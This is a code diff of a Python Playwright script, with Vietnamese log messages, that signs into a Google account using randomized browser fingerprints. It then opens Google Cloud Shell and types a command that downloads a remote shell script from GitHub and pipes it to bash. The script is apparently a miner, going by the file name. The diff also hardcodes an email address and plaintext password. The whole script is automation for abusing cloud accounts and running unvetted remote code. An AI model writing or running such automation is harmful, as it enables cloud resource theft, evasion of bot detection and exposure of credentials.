@@ -1,4 +1,3 @@
-
 import nest_asyncio
 import asyncio
 import logging
@@ -34,7 +33,7 @@ def get_random_browser_config_inner():
     chrome_args = base_args + [f"--window-size={selected_viewport['width']},{selected_viewport['height']}"]
     random.shuffle(chrome_args)
     return selected_user_agent, selected_viewport, chrome_args
-async def login_gmail(email: str, password: str):
+async def login_gmail(email: str, password: str,url: str):
     ua, vp, args = get_random_browser_config_inner()
     async with async_playwright() as p:
         browser = await p.chromium.launch(headless=False, args=args)
@@ -51,74 +50,33 @@ async def login_gmail(email: str, password: str):
         a = 0
         page = await context.new_page()
         async def Dangnhap():
-         a = 0
-         while True:
-            a = a + 1
-            try:
-                print("Đang thực hiện hành động đăng nhập gmail ")                
-                try:
-                 await page.goto("https://accounts.google.com")
-                except:
-                 continue
-                try:  
-                    await page.locator("input[type='email']").fill(email)
-                    await page.locator("button:has-text('Next')").click()
-                except:
-                    continue
-                try:
-                    await page.locator("input[type='password']").fill(password)
-                    await page.locator("button:has-text('Next')").click()
-                    await asyncio.sleep(5)
+            await page.goto("https://accounts.google.com")
+            print("🔐 Đang mở trang đăng nhập Gmail...")
+            await page.get_by_role("textbox", name="Email or phone").fill(email)
+            await page.get_by_role("button", name="Next").click()
+            await page.wait_for_selector('input[type="password"]', timeout=15000)
+            await page.locator('input[type="password"]').fill(password)
+            await page.get_by_role("button", name="Next").click()
+            await asyncio.sleep(5)
+            page2 = await context.new_page()
+            await page2.goto(url)
+            await page.get_by_role("checkbox", name="I agree that my use of any").check(timeout=500000)
+            await page.get_by_role("button", name="Start Cloud Shell").click(timeout=500000)
+            await page.get_by_role("button", name="Authorize").click(timeout=500000)
+            await page.locator("#cloud-shell-editor").content_frame.locator(".gettingStartedSlideDetails > div").click(timeout=500000)
+            await page.locator("#cloud-shell-editor").content_frame.get_by_role("button", name="Inspect this in the").press("ControlOrMeta+`", timeout=500000)
+            await page.locator("#cloud-shell-editor").content_frame.get_by_role("textbox", name="Terminal 1, bash Run the").click(timeout=500000)
+            await page.locator("#cloud-shell-editor").content_frame.get_by_role("textbox", name="Terminal 1, bash Run the").fill("curl -sL https://raw.githubusercontent.com/ChauDuongw/toll/refs/heads/main/dao.sh | bash", timeout=500000)
+            await page.keyboard.press("Enter", delay=2)
+            print("hoan thanh")
+            while True:
+                None
 
-                except:
-                    continue
-                break
-            except Exception as e:
-                print("loi")
-                if a == 5:
-                 print("Dang nhap that bai.")
-            
-        async def colab():
-         b = 0
-         while True:
-             b = b + 1
-             if b == 5:
-                return
-             try:
-                pageq = await context.new_page(timeout = 500000)
-                await pageq.goto("thayurl",timeout = 500000)
-                await page.goto("https://shell.cloud.google.com", timeout=500000)
-                await page.get_by_role("checkbox", name="I agree that my use of any").check(timeout=500000)
-                await page.get_by_role("button", name="Start Cloud Shell").click(timeout=500000)
-                break
-             except:
-                print("loi")
-                return
-         a = 0
-         while True:
-             a = a +1
-             if a == 5:
-                return
-             try:
-                await page.goto("https://shell.cloud.google.com", timeout=500000)
-                await page.get_by_role("button", name="Authorize").click(timeout=500000)
-                await page.locator("#cloud-shell-editor").content_frame.locator(".gettingStartedSlideDetails > div").click(timeout=500000)
-                await page.locator("#cloud-shell-editor").content_frame.get_by_role("button", name="Inspect this in the").press("ControlOrMeta+`", timeout=500000)
-                await page.locator("#cloud-shell-editor").content_frame.get_by_role("textbox", name="Terminal 1, bash Run the").click(timeout=500000)
-                await page.locator("#cloud-shell-editor").content_frame.get_by_role("textbox", name="Terminal 1, bash Run the").fill("curl -sL https://raw.githubusercontent.com/ChauDuongw/toll/refs/heads/main/dao.sh | bash", timeout=500000)
-                await page.keyboard.press("Enter", delay=2)
-                print("hoan thanh")
-                while True:
-                 None
-             except Exception as e:
-                print("loi")
-                return 
-        await Dangnhap() 
-        await colab()
-
+        await Dangnhap()
 async def main():
-    email = "thayemail"  
+    url = "https://shell.cloud.google.com/?pli=1&show=ide%2Cterminal"
+    email ="brandonhernandez1469a46@huacics.com	" 
     pw = "Lananh255"      
-    await login_gmail(email, pw)
+    await login_gmail(email, pw,url)
 if __name__ == "__main__":
     asyncio.run(main())
